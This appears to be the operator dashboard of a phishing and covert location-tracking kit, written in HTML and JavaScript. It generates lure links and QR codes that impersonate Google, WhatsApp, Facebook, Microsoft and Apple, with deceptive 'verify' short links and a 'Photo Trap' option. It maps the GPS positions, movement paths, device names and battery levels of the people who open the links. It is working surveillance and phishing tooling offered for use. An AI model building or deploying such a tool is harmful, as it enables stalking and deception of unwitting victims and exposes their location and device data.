<!DOCTYPE html>
<html>
<head>
    <title>Live Location Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #1a1a2e; }

        #topBar {
            background: #16213e;
            color: white;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            border-bottom: 2px solid #0f3460;
            position: relative;
            z-index: 1001;
        }
        #topBar h1 { font-size: 18px; font-weight: 600; }
        #topBar h1 span { color: #e94560; }
        #topBar .status { font-size: 13px; opacity: 0.8; }
        #topBar .status .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .dot.green { background: #4caf50; }
        .dot.yellow { background: #ffc107; }
        .dot.red { background: #f44336; }

        #infoPanel {
            background: #16213e;
            color: #e0e0e0;
            padding: 12px 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 15px 30px;
            font-size: 13px;
            border-bottom: 1px solid #0f3460;
            position: relative;
            z-index: 1000;
        }
        #infoPanel .item { display: flex; align-items: center; gap: 6px; }
        #infoPanel .label { opacity: 0.6; }
        #infoPanel .value { font-weight: 500; color: #fff; }

        #map { height: calc(100vh - 280px); width: 100vw; }

        #actions {
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            background: rgba(22, 33, 62, 0.9);
            backdrop-filter: blur(8px);
            padding: 12px 20px;
            border-radius: 50px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            display: none;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
            border: 1px solid #0f3460;
        }
        #actions button {
            text-decoration: none; padding: 8px 16px; border-radius: 30px;
            font-weight: 600; font-size: 13px; border: none;
            cursor: pointer; transition: all 0.2s;
            display: inline-flex; align-items: center; gap: 6px;
        }
        #actions .btn-clear { background: #e94560; color: white; }
        #actions .btn-clear:hover { background: #c62840; }

        /* Sections */
        #brandSelector, #photoTrapSection, #qrSection {
            background: #16213e;
            padding: 10px 20px;
            border-bottom: 1px solid #0f3460;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
        }
        #brandSelector label, #photoTrapSection label, #qrSection label {
            color: #e0e0e0;
            font-size: 13px;
            opacity: 0.7;
        }
        #brandSelector select, #photoTrapSection select, #qrSection select {
            background: #0f3460;
            color: white;
            border: 1px solid #1a4a6e;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 13px;
            cursor: pointer;
        }
        #brandSelector .link-display, #photoTrapSection .link-display {
            background: #0f3460;
            padding: 6px 12px;
            border-radius: 6px;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            flex: 1;
            min-width: 200px;
            color: #4caf50;
        }
        #brandSelector .copy-link, #photoTrapSection .copy-link, #qrSection .copy-link {
            background: #4caf50;
            color: white;
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            font-weight: 600;
        }
        #brandSelector .copy-link:hover, #photoTrapSection .copy-link:hover, #qrSection .copy-link:hover { background: #388e3c; }
        #brandSelector .short-link {
            color: #ffc107;
            font-size: 13px;
            font-weight: bold;
            background: #0f3460;
            padding: 6px 12px;
            border-radius: 6px;
            font-family: monospace;
        }
        #qrSection input {
            background: #0f3460;
            color: white;
            border: 1px solid #1a4a6e;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            flex: 1;
            min-width: 150px;
        }
        #qrContainer {
            display: none;
            background: #0f3460;
            padding: 10px;
            border-radius: 8px;
            width: 100%;
            text-align: center;
        }
        #qrContainer img { max-width: 200px; border-radius: 8px; }
        #qrSection .btn-qr { background: #4285f4; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; }
        #qrSection .btn-qr:hover { background: #3367d6; }
        #qrSection .btn-download { background: #4caf50; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; margin-top: 8px; }
        #qrSection .btn-download:hover { background: #388e3c; }

        @media (max-width: 768px) {
            #brandSelector, #photoTrapSection, #qrSection { flex-direction: column; align-items: stretch; }
            #brandSelector .link-display, #photoTrapSection .link-display { min-width: auto; }
        }

        #historySection {
            position: relative;
            z-index: 1000;
            background: #16213e;
            border-top: 1px solid #0f3460;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        #historySection .history-toggle {
            background: #0f3460;
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 30px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s;
        }
        #historySection .history-toggle:hover { background: #1a4a6e; }
        #historyPanel {
            background: #0f3460;
            border-radius: 8px;
            padding: 15px;
            max-height: 200px;
            overflow-y: auto;
            flex: 1;
            min-width: 200px;
            display: none;
            color: #e0e0e0;
            font-size: 12px;
        }
        #historyPanel h3 { color: #4caf50; font-size: 14px; margin-bottom: 10px; }
        #historyPanel .entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
        #historyPanel .entry .time { opacity: 0.5; }
        #historyPanel .entry .coords { color: #4caf50; }
        #historyPanel .entry .user { color: #e94560; font-weight: 600; }
        #historyPanel::-webkit-scrollbar { width: 4px; }
        #historyPanel::-webkit-scrollbar-thumb { background: #1a4a6e; border-radius: 4px; }
        #historyPanel .empty { opacity: 0.5; text-align: center; padding: 10px; }

        #usersCount {
            padding: 4px 12px;
            background: #0f3460;
            border-radius: 20px;
            font-size: 12px;
            color: #4caf50;
            border: 1px solid #4caf50;
        }
        @media (max-width: 768px) {
            #topBar { flex-direction: column; align-items: flex-start; }
            #infoPanel { flex-direction: column; gap: 5px; }
            #actions { flex-direction: column; width: 90%; border-radius: 16px; padding: 15px; }
            #actions button { width: 100%; justify-content: center; }
            #historySection { flex-direction: column; align-items: stretch; }
        }
    </style>
</head>
<body>

<div id="topBar">
    <h1>📍 <span>Live</span> Tracker <span id="usersCount" style="font-size:12px;margin-left:8px;">👥 0 users</span></h1>
    <div class="status">
        <span class="dot yellow" id="statusDot"></span>
        <span id="statusText">Waiting for users...</span>
    </div>
</div>

<!-- Brand Selector with updated short links -->
<div id="brandSelector">
    <label for="brandSelect">🔗 Send Link:</label>
    <select id="brandSelect">
        <option value="google">🔵 Google</option>
        <option value="whatsapp" selected>💬 WhatsApp</option>
        <option value="facebook">🔷 Facebook</option>
        <option value="microsoft">⬡ Microsoft</option>
        <option value="apple"> Apple</option>
    </select>
    <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
    <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
    <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
</div>

<!-- Photo Trap -->
<div id="photoTrapSection">
    <label>📷 Photo Trap:</label>
    <select id="photoTemplateSelect">
        <option value="google">🔵 Google</option>
        <option value="whatsapp" selected>💬 WhatsApp</option>
        <option value="facebook">🔷 Facebook</option>
        <option value="microsoft">⬡ Microsoft</option>
        <option value="apple"> Apple</option>
    </select>
    <input type="text" id="customImageInput" placeholder="Image URL (optional)" style="background:#0f3460;color:white;border:1px solid #1a4a6e;padding:6px 12px;border-radius:6px;font-size:12px;flex:1;min-width:150px;">
    <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
    <button class="copy-link" id="copyPhotoLinkBtn">📋 Copy</button>
</div>

<!-- QR Code Generator -->
<div id="qrSection">
    <label>📱 QR Code:</label>
    <select id="qrTemplateSelect">
        <option value="google">🔵 Google</option>
        <option value="whatsapp" selected>💬 WhatsApp</option>
        <option value="facebook">🔷 Facebook</option>
        <option value="microsoft">⬡ Microsoft</option>
        <option value="apple"> Apple</option>
    </select>
    <input type="text" id="qrImageInput" placeholder="Custom image URL (optional)">
    <button class="btn-qr" id="generateQrBtn">🔄 Generate QR</button>
    <div id="qrContainer">
        <img id="qrCodeImg" src="" alt="QR Code">
        <br>
        <button class="btn-download" id="downloadQrBtn">💾 Download QR</button>
    </div>
</div>

<!-- Info Panel -->
<div id="infoPanel">
    <div class="item"><span class="label">👥 Active Users:</span><span class="value" id="userCountDisplay">0</span></div>
    <div class="item"><span class="label">📊 Total Locations:</span><span class="value" id="totalLocationsDisplay">0</span></div>
    <div class="item"><span class="label">🕐 Last update:</span><span class="value" id="timeDisplay">--</span></div>
</div>

<div id="map"></div>

<div id="actions">
    <button class="btn-clear" id="clearBtn">🗑️ Clear All Data</button>
</div>

<div id="historySection">
    <button class="history-toggle" id="historyToggle">📋 Show All History</button>
    <div id="historyPanel">
        <h3>📋 Location History (All Users)</h3>
        <div id="historyList"><div class="empty">No history yet</div></div>
    </div>
</div>

<script>
    // =============================================
    // CONFIGURATION
    // =============================================
    const RENDER_URL = '';
    const BASE_URL = 'https://location-tracker-cn7m.onrender.com';

    // =============================================
    // UPDATED REBRANDLY SHORT LINKS
    // =============================================
    const SHORT_LINKS = {
        google: 'rebrand.ly/verify-google',
        whatsapp: 'rebrand.ly/verify-wa',
        facebook: 'rebrand.ly/verify-FACEBOOK',
        microsoft: 'rebrand.ly/verify-ms',
        apple: 'rebrand.ly/apple-security'
    };

    // =============================================
    // DOM Elements
    // =============================================
    const brandSelect = document.getElementById('brandSelect');
    const linkDisplay = document.getElementById('linkDisplay');
    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
    const copyLinkBtn = document.getElementById('copyLinkBtn');

    function updateLink() {
        const brand = brandSelect.value;
        const fullUrl = BASE_URL + '/?template=' + brand;
        const shortUrl = SHORT_LINKS[brand] || '';
        linkDisplay.textContent = fullUrl;
        shortLinkDisplay.textContent = shortUrl;
    }

    brandSelect.addEventListener('change', updateLink);
    updateLink();

    copyLinkBtn.addEventListener('click', function() {
        const link = linkDisplay.textContent;
        navigator.clipboard.writeText(link).then(() => {
            const originalText = copyLinkBtn.textContent;
            copyLinkBtn.textContent = '✅ Copied!';
            setTimeout(() => {
                copyLinkBtn.textContent = originalText;
            }, 2000);
        }).catch(() => {
            const range = document.createRange();
            range.selectNode(linkDisplay);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            const originalText = copyLinkBtn.textContent;
            copyLinkBtn.textContent = '✅ Copied!';
            setTimeout(() => {
                copyLinkBtn.textContent = originalText;
            }, 2000);
        });
    });

    // =============================================
    // PHOTO TRAP
    // =============================================
    const photoTemplateSelect = document.getElementById('photoTemplateSelect');
    const customImageInput = document.getElementById('customImageInput');
    const photoLinkDisplay = document.getElementById('photoLinkDisplay');
    const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');

    function updatePhotoLink() {
        const template = photoTemplateSelect.value;
        const customImg = customImageInput.value.trim();
        let url = BASE_URL + '/photo?template=' + template;
        if (customImg) {
            url += '&img=' + encodeURIComponent(customImg);
        }
        photoLinkDisplay.textContent = url;
    }

    photoTemplateSelect.addEventListener('change', updatePhotoLink);
    customImageInput.addEventListener('input', updatePhotoLink);
    updatePhotoLink();

    copyPhotoLinkBtn.addEventListener('click', function() {
        const link = photoLinkDisplay.textContent;
        navigator.clipboard.writeText(link).then(() => {
            const originalText = copyPhotoLinkBtn.textContent;
            copyPhotoLinkBtn.textContent = '✅ Copied!';
            setTimeout(() => {
                copyPhotoLinkBtn.textContent = originalText;
            }, 2000);
        }).catch(() => {
            const range = document.createRange();
            range.selectNode(photoLinkDisplay);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            const originalText = copyPhotoLinkBtn.textContent;
            copyPhotoLinkBtn.textContent = '✅ Copied!';
            setTimeout(() => {
                copyPhotoLinkBtn.textContent = originalText;
            }, 2000);
        });
    });

    // =============================================
    // QR CODE GENERATOR
    // =============================================
    const qrTemplateSelect = document.getElementById('qrTemplateSelect');
    const qrImageInput = document.getElementById('qrImageInput');
    const generateQrBtn = document.getElementById('generateQrBtn');
    const qrContainer = document.getElementById('qrContainer');
    const qrCodeImg = document.getElementById('qrCodeImg');
    const downloadQrBtn = document.getElementById('downloadQrBtn');

    generateQrBtn.addEventListener('click', function() {
        const template = qrTemplateSelect.value;
        const customImg = qrImageInput.value.trim();
        let url = BASE_URL + '/photo?template=' + template;
        if (customImg) {
            url += '&img=' + encodeURIComponent(customImg);
        }
        const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
        qrCodeImg.src = qrApiUrl;
        qrContainer.style.display = 'block';
    });

    downloadQrBtn.addEventListener('click', function() {
        const link = document.createElement('a');
        link.download = 'photo-trap-qr.png';
        link.href = qrCodeImg.src;
        link.click();
    });

    // =============================================
    // MAP & MULTI-USER TRACKING
    // =============================================
    const map = L.map('map').setView([51.505, -0.09], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
    }).addTo(map);

    let markers = {};
    let historyData = [];
    let historyVisible = false;

    const colors = [
        '#e94560', '#4caf50', '#ffc107', '#4285f4', '#ff5722',
        '#9c27b0', '#00bcd4', '#ff9800', '#8bc34a', '#e91e63',
        '#3f51b5', '#ff6f00', '#00acc1', '#d32f2f', '#2e7d32'
    ];
    let colorIndex = 0;

    function getColor() {
        const color = colors[colorIndex % colors.length];
        colorIndex++;
        return color;
    }

    function getDeviceName(deviceInfo) {
        if (!deviceInfo) return 'Unknown';
        if (typeof deviceInfo === 'string') {
            try {
                const parsed = JSON.parse(deviceInfo);
                return parsed.device_name || parsed.platform || 'Unknown';
            } catch { return 'Unknown'; }
        }
        return deviceInfo.device_name || deviceInfo.platform || 'Unknown';
    }

    function getShortId(sessionId) {
        if (!sessionId) return 'Unknown';
        return sessionId.substring(0, 8);
    }

    function setStatus(text, type = 'waiting') {
        document.getElementById('statusText').textContent = text;
        const dot = document.getElementById('statusDot');
        dot.className = 'dot';
        if (type === 'waiting') dot.classList.add('yellow');
        else if (type === 'active') dot.classList.add('green');
        else if (type === 'error') dot.classList.add('red');
    }

    function formatTime(iso) {
        if (!iso) return '--';
        try {
            const date = new Date(iso);
            return date.toLocaleTimeString() + ' ' + date.toLocaleDateString();
        } catch { return iso; }
    }

    function updateUsersCount(count) {
        document.getElementById('usersCount').textContent = `👥 ${count} users`;
        document.getElementById('userCountDisplay').textContent = count;
    }

    function updateTotalLocations(count) {
        document.getElementById('totalLocationsDisplay').textContent = count;
    }

    // =============================================
    // FETCH USERS
    // =============================================
    function fetchUsers() {
        fetch(RENDER_URL + '/get-users')
            .then(response => response.json())
            .then(users => {
                const count = users.length;
                updateUsersCount(count);
                setStatus(`🟢 ${count} active users`, 'active');

                const activeSessions = new Set();

                users.forEach(user => {
                    const sessionId = user.session_id || 'unknown';
                    activeSessions.add(sessionId);
                    const lat = user.lat;
                    const lng = user.lng;
                    const accuracy = user.accuracy;
                    const deviceName = getDeviceName(user.device_info);
                    const timestamp = user.timestamp;

                    if (lat && lng) {
                        if (!markers[sessionId]) {
                            const color = getColor();
                            markers[sessionId] = {
                                color: color,
                                pathCoordinates: [],
                                pathLine: null
                            };
                        }

                        const markerData = markers[sessionId];
                        const color = markerData.color;

                        if (markerData.marker) {
                            markerData.marker.setLatLng([lat, lng]);
                        } else {
                            const icon = L.divIcon({
                                html: `<div style="background:${color};width:16px;height:16px;border-radius:50%;border:3px solid white;box-shadow:0 2px 6px rgba(0,0,0,0.3);"></div>`,
                                className: '',
                                iconSize: [16, 16],
                                iconAnchor: [8, 8]
                            });
                            markerData.marker = L.marker([lat, lng], { icon: icon }).addTo(map);
                            const popupContent = `
                                <b>👤 User:</b> ${getShortId(sessionId)}<br>
                                <b>📱 Device:</b> ${deviceName}<br>
                                <b>📍 Location:</b> ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>
                                <b>🎯 Accuracy:</b> ${accuracy ? accuracy.toFixed(0) + 'm' : '--'}<br>
                                <b>🔋 Battery:</b> ${user.battery ? user.battery.level + '%' : '--'}<br>
                                <b>🕐 Last update:</b> ${formatTime(timestamp)}
                            `;
                            markerData.marker.bindPopup(popupContent);
                        }

                        if (markerData.circle) {
                            markerData.circle.setLatLng([lat, lng]);
                            if (accuracy) markerData.circle.setRadius(accuracy);
                        } else if (accuracy) {
                            markerData.circle = L.circle([lat, lng], {
                                radius: accuracy,
                                color: color,
                                fillColor: color,
                                fillOpacity: 0.1,
                                weight: 1
                            }).addTo(map);
                        }

                        markerData.pathCoordinates.push([lat, lng]);
                        if (markerData.pathCoordinates.length > 2) {
                            if (markerData.pathLine) {
                                map.removeLayer(markerData.pathLine);
                            }
                            markerData.pathLine = L.polyline(markerData.pathCoordinates, {
                                color: color,
                                weight: 2,
                                opacity: 0.5,
                                lineJoin: 'round'
                            }).addTo(map);
                        }
                    }
                });

                Object.keys(markers).forEach(sessionId => {
                    if (!activeSessions.has(sessionId)) {
                        if (markers[sessionId].marker) {
                            map.removeLayer(markers[sessionId].marker);
                        }
                        if (markers[sessionId].circle) {
                            map.removeLayer(markers[sessionId].circle);
                        }
                        if (markers[sessionId].pathLine) {
                            map.removeLayer(markers[sessionId].pathLine);
                        }
                        delete markers[sessionId];
                    }
                });

                if (users.length > 0) {
                    const latest = users.reduce((a, b) => {
                        return a.timestamp > b.timestamp ? a : b;
                    });
                    document.getElementById('timeDisplay').textContent = formatTime(latest.timestamp);
                }

                fetch(RENDER_URL + '/get-all-history')
                    .then(res => res.json())
                    .then(history => {
                        updateTotalLocations(history.length);
                    })
                    .catch(() => {});
            })
            .catch(err => {
                console.error('Fetch error:', err);
                setStatus('⚠️ Connection error', 'error');
            });
    }

    // =============================================
    // FETCH HISTORY
    // =============================================
    function fetchHistory() {
        fetch(RENDER_URL + '/get-all-history')
            .then(response => response.json())
            .then(data => {
                historyData = data;
                renderHistory();
            })
            .catch(err => console.error('History fetch error:', err));
    }

    function renderHistory() {
        const list = document.getElementById('historyList');
        if (!historyData || historyData.length === 0) {
            list.innerHTML = '<div class="empty">No history yet</div>';
            return;
        }
        let html = '';
        const reversed = [...historyData].reverse();
        const displayData = reversed.slice(0, 100);
        displayData.forEach(entry => {
            if (entry.lat && entry.lng) {
                const user = getShortId(entry.session_id || 'unknown');
                const device = getDeviceName(entry.device_info);
                html += `
                    <div class="entry">
                        <span class="time">${formatTime(entry.timestamp)}</span>
                        <span class="user">👤 ${user}</span>
                        <span class="coords">${entry.lat.toFixed(5)}, ${entry.lng.toFixed(5)}</span>
                        ${entry.accuracy ? `<span style="opacity:0.5;"> ±${entry.accuracy.toFixed(0)}m</span>` : ''}
                        <span style="opacity:0.5;font-size:10px;">(${device})</span>
                    </div>
                `;
            }
        });
        list.innerHTML = html;
    }

    // =============================================
    // CLEAR DATA
    // =============================================
    function clearData() {
        if (confirm('🗑️ Clear all location data for all users?')) {
            fetch(RENDER_URL + '/clear')
                .then(() => {
                    Object.keys(markers).forEach(sessionId => {
                        if (markers[sessionId].marker) {
                            map.removeLayer(markers[sessionId].marker);
                        }
                        if (markers[sessionId].circle) {
                            map.removeLayer(markers[sessionId].circle);
                        }
                        if (markers[sessionId].pathLine) {
                            map.removeLayer(markers[sessionId].pathLine);
                        }
                    });
                    markers = {};
                    colorIndex = 0;
                    updateUsersCount(0);
                    updateTotalLocations(0);
                    document.getElementById('timeDisplay').textContent = '--';
                    setStatus('🗑️ Data cleared', 'waiting');
                    historyData = [];
                    renderHistory();
                })
                .catch(err => console.error('Clear error:', err));
        }
    }

    function toggleHistory() {
        historyVisible = !historyVisible;
        const panel = document.getElementById('historyPanel');
        const btn = document.getElementById('historyToggle');
        panel.style.display = historyVisible ? 'block' : 'none';
        btn.textContent = historyVisible ? '📋 Hide History' : '📋 Show History';
        if (historyVisible) fetchHistory();
    }

    document.getElementById('clearBtn').addEventListener('click', clearData);
    document.getElementById('historyToggle').addEventListener('click', toggleHistory);

    // =============================================
    // POLLING
    // =============================================
    setInterval(fetchUsers, 3000);
    fetchUsers();

    setInterval(fetchHistory, 10000);

    window.addEventListener('resize', function() {
        setTimeout(function() { map.invalidateSize(); }, 200);
    });

    console.log('📍 Multi-User Dashboard initialized');
</script>
</body>
</html>
